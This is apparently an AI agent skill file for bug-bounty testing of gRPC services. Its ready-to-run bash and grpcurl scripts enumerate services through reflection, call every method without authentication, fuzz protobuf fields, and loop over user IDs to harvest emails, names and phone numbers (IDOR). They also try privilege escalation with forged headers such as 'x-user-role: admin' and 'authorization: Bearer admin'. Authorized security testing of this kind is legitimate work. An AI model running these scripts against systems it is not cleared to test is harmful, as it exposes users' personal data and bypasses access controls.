---
name: k1nzr3c0n-hunt-grpc
description: "Hunt gRPC service vulnerabilities. Reflection API exposure (lists all services/methods = full attack surface map), unauthenticated method calls, protobuf field fuzzing (type confusion, required field omission), metadata injection (authorization header bypass), gRPC-Web gateway misconfigs."
tags: [grpc, protobuf, reflection, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — gRPC Services

> **Reflection is the crown jewel**: it gives you a full service/method map without the .proto file.
> **Tools**: grpcurl (must-have), grpc-client-cli, Postman (gRPC tab), Burp Suite (gRPC extension).

---

## Phase 0 — Detect gRPC

```bash
TARGET="${TARGET:-}"
PORT="${GRPC_PORT:-443}"
HUNT="/tmp/hunt_grpc_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

echo "=== gRPC Detection ==="
# HTTP/2 content-type check
curl -sk -H "Content-Type: application/grpc" \
  "https://${TARGET}:${PORT}/" \
  -w "\nHTTP: %{http_code} Content-Type: %{content_type}\n" | tail -2

# HTTP/1.1 gRPC-Web detection
curl -sk -H "Content-Type: application/grpc-web+proto" \
  "https://${TARGET}/grpc" -o /dev/null -w "  gRPC-Web: %{http_code}\n"

echo ""
echo "Check for known gRPC gateway paths:"
for PATH_G in /grpc /api/grpc /rpc /v1/grpc; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}${PATH_G}")
  [ "$CODE" != "404" ] && echo "  [$CODE] ${PATH_G}"
done

echo ""
echo "Install grpcurl: go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest"
```

## Phase 1 — Service Reflection Enumeration

```bash
echo "=== gRPC Reflection (list all services and methods) ==="
TARGET_HOST="${TARGET}:${GRPC_PORT:-443}"

echo "Attempt reflection (no auth):"
grpcurl "${TARGET_HOST}" list 2>/dev/null | tee "$HUNT/services.txt" | sed 's/^/  [SERVICE] /'

echo ""
echo "List methods for each discovered service:"
cat "$HUNT/services.txt" 2>/dev/null | while read SVC; do
  echo "  --- ${SVC} ---"
  grpcurl "${TARGET_HOST}" list "$SVC" 2>/dev/null | sed 's/^/    [METHOD] /'
done

echo ""
echo "Describe a service (get field names and types):"
echo "  grpcurl $TARGET_HOST describe ServiceName.MethodName"
```

## Phase 2 — Unauthenticated Method Calls

```bash
echo "=== Unauthenticated gRPC Calls ==="
TARGET_HOST="${TARGET}:${GRPC_PORT:-443}"

echo "Test each method without authorization header:"
cat "$HUNT/services.txt" 2>/dev/null | while read SVC; do
  grpcurl "${TARGET_HOST}" list "$SVC" 2>/dev/null | while read METHOD; do
    RESP=$(grpcurl "${TARGET_HOST}" "$METHOD" 2>&1)
    
    # Check if accessible
    if echo "$RESP" | grep -q "StatusCode = StatusCode.Unauthenticated\|requires authentication"; then
      echo "  [AUTH-REQUIRED] ${METHOD}"
    elif echo "$RESP" | grep -q "StatusCode = StatusCode.OK\|{"; then
      echo "  [OPEN] ${METHOD}"
      echo "$RESP" | head -5 | sed 's/^/    /'
    elif echo "$RESP" | grep -q "EOF\|no body"; then
      echo "  [EMPTY-OK] ${METHOD} — no required fields, returned empty"
    else
      echo "  [${RESP:0:40}] ${METHOD}"
    fi
  done
done
```

## Phase 3 — Protobuf Field Fuzzing

```bash
echo "=== Protobuf Field Fuzzing ==="
TARGET_HOST="${TARGET}:${GRPC_PORT:-443}"
METHOD="${GRPC_METHOD:-UserService.GetUser}"

echo "Describe the method to find field names:"
grpcurl "${TARGET_HOST}" describe "$METHOD" 2>/dev/null | sed 's/^/  /'

echo ""
echo "Type confusion: send wrong types for fields"
echo '  grpcurl -d '"'"'{"id": "not-a-number"}'"'"' TARGET METHOD'
echo '  grpcurl -d '"'"'{"id": -1}'"'"' TARGET METHOD'
echo '  grpcurl -d '"'"'{"id": 0}'"'"' TARGET METHOD'
echo '  grpcurl -d '"'"'{"id": 99999999}'"'"' TARGET METHOD  (IDOR test)'

echo ""
echo "IDOR via user ID:"
for ID in 1 2 3 100 999; do
  grpcurl -d "{\"id\": $ID}" "${TARGET_HOST}" "$METHOD" 2>/dev/null | \
    grep -i 'email\|name\|phone' | head -1 | sed "s/^/  [ID=$ID] /"
done
```

## Phase 4 — Metadata Injection

```bash
echo "=== gRPC Metadata (Header) Injection ==="
TARGET_HOST="${TARGET}:${GRPC_PORT:-443}"
METHOD="${GRPC_METHOD:-UserService.GetAdminList}"

echo "Test privilege escalation via metadata headers:"

# Try admin role header
grpcurl -H "x-user-role: admin" "${TARGET_HOST}" "$METHOD" 2>/dev/null | \
  grep -v 'StatusCode\|Error' | head -5 | sed 's/^/  [ROLE-HEADER] /'

# Bypass auth entirely
grpcurl -H "authorization: Bearer admin" "${TARGET_HOST}" "$METHOD" 2>/dev/null | head -5 | sed 's/^/  [FAKE-TOKEN] /'

# Internal flag
grpcurl -H "x-internal-request: true" "${TARGET_HOST}" "$METHOD" 2>/dev/null | head -5 | sed 's/^/  [INTERNAL-FLAG] /'
```

## Gate 0

```bash
echo "=== gRPC Gate 0 ==="
echo "  □ Reflection: grpcurl list returns service/method catalog"
echo "  □ Unauth access: method responds with data (not Unauthenticated)"
echo "  □ IDOR: different user IDs return different users' data"
echo "  □ Metadata bypass: role/admin header changes response"
echo "  □ Field fuzzing: negative/zero/oversized ID returns unexpected data"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
gRPC reflection exposed on [api.target.com:443]: grpcurl list returns 12 services and 47 methods including UserService.GetAllUsers — unauthenticated full API surface enumeration
gRPC IDOR: UserService.GetUser with id=2 returns user2@target.com profile without authentication (method requires no token) — unauthenticated data exposure for all user IDs
```
